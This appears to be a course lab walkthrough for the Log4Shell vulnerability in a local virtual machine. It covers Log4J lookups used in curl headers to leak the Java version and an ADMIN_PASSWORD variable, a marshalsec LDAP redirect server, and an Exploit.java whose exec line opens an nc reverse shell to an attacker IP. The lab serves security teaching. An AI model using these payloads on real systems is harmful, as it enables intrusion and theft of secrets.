# Intro to Information Security 3 | Log4J Vulnerabilities

### 1. Log4J

#### (1) Intro

- **Log4J** is a very popular open-source framework that allows application developers to log important messages such as program flow, program state, exceptions, etc. These messages can include user input, dynamic data, database results, etc.
- **Java Naming and Directory Interface (JNDI)** creates a way for Java Objects to be looked up at runtime. An application only needs to know the JNDI name instead of having to have the connection details. JNDI uses Naming References if the object is too large.
- **Lightweight Directory Access Protocol (LDAP)** provides the communication language that is required to receive and send information from directory services. It is not specific to Java. . It can be used for authentication like sending usernames/passwords or retrieving object data through a url from another server.
- **Log4J Lookups** allow string substitution of certain strings. These are in the form of `${prefix:name}`. For example:
    - **`${java:runtime}`**: gives java runtime version like `Java(TM) SE Runtime Environment (build 1.7.0_67-b01) from Oracle Corporation`
    - **`${java:version}`**: gives java short version information like `Java version 1.7.0_67`
    - **`${env:USER}`**: gives the value of environment variable `USER`

#### (2) Servers Setup

Let's first open three terminals in the virtual machine. In the first terminal, we should start the LDAP server by,

```
$ cd ~/Desktop/log4shell/target
$ java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:4242/#Exploit"
```

In the second terminal, we should run the malicious server by,

```
$ python3 -m http.server 4242 
```
 
In the last terminal, we should can use `nc` command to listen to the port that we specified. For example, if we want to listen to the port `8888`, we can run,

```
$ nc -nlvp 8888
```

See what the options of `nc` means from this [link](https://www.explainshell.com/explain?cmd=nc+-nlvp+8888).

#### (3) Task 0: get Java version

We can use `curl` to interact with Log4J. For example, we can run,

```
$ curl 'http://localhost:8080/rest/users/ping' -H 'GATECH_ID:123456789'
```

This will send a get request to `http://localhost:8080/rest/users/ping` with the `GATECH_ID` variable in the HTTP header set to `123456789`.

We can assign more information in the header like,

```
$ curl 'http://localhost:8080/rest/users/userlist' \
-H 'GATECH_ID:123456789' \
-H 'Accept:application/json' \
-H 'X-UserName:rcoleman8'
```

Then we can go and view the file `log/cs6035.log` and see the logs from the server. Then we can figure out,

- From the line `... INFO GET ...`, the `Accept` key is assigned with value `application/json`
- From the line `... DEBUG **** ... GATECH_ID ...`, the `GATECH_ID` key is assigned with value `123456789`
- From the line `... INFO X-UserName ...`, the `X-UserName` key is assigned with value `rcoleman8`

Now our task is to change the value of `Accept` to the version of Java on the server. Recall the string substitution we have talked about above and configure the following command. 

```
$ curl 'http://localhost:8080/rest/users/ping' \
-H 'GATECH_ID:123456789' \
-H 'Accept:application/json' \
```

Then we should get something in the log like,

```
...
[...] GET, In service method - ... - Accept: Java version 1.8.0_20
...
```

Remember we have at least 4 keys we can use to exploit. These are,
- GATECH_ID
- Content-type
- Accept
- X-UserName

#### (1) Task 1: get environment variable

Recall again for the string substitution part and this time we have to get the value of an environment variable `ADMIN_PASSWORD`. Modify the following command to construct a malicious payload,

```
$ curl 'http://localhost:8080/rest/users/ping' \
-H 'GATECH_ID:123456789' \
-H 'Accept:application/json' \
```

Then find the flag 1 in the result. 

#### (2) Task 2: Get a shell

If you closed the terminals in the setup stage and the ports are not available, you can try to restart the virtual machine and rerun the setups.

In this task, we will try to get a shell by log4J, and this task simply shows why this vulnerability is serious. To exploit this task, you will find [this video](https://www.youtube.com/watch?v=lJeAgQQaDEw) useful.

To solve this problem, we have to open 4 terminals. 

In the first terminal, we have to start the LDAP server by,

```
$ cd ~/Desktop/log4shell/target
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:4242/#Exploit"
```

This will redirect LDAP to `4242` port and listen to the requests to the `1389` port. 

In the second terminal, we have to go to the `Flag2` directory and finish the exploit file. After that, we should compile the exploit file and make the current directory a malicious server.

To modify the exploit file `Exploit.java`, the first step is to find the internal IP address of the current VM (aka. Attacker IP). We can use the following command to check it out,

```
$ cd Desktop/log4shell/Flag2
$ hostname -I | awk '{print $1}'
```

Then we have to modify the exploit file. The following line can be used to get the shell,

```
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <Attacker IP> <Target Port>");
```

The video will help to understand the line above. Then we should compile this file by,

```
$ javac Exploit.java
```

And it will generate a `Exploit.class` file and we should use it as our entry point to execute. Finally, we should make the current directory a server on the port `4242` to get the request from the LDAP server. The `Target Port` is used to listen the information after we execute the exploit file. We can assign it to `8888` or `9999` or whatever we like.

In the third terminal, we should use `nc` command to listen to the `Target Port` we have assigned (should be `8888` or `9999` or else).

```
$ nc -nvlp <Target Port>
```

In the last terminal, we have to run our payload by `curl`. It should be similar to the ones we have used in task0 and task1. The lookup should have the following structure,

```
${jndi:ldap://<attackerIP>:1389/<exploitFileName>}
```

Where `1389` is the port that the LDAP server will listen.

After we get the shell, we can use the following commands to get the flag2,

```
cd ../..
java -jar Flag2.jar
```

#### (3) 




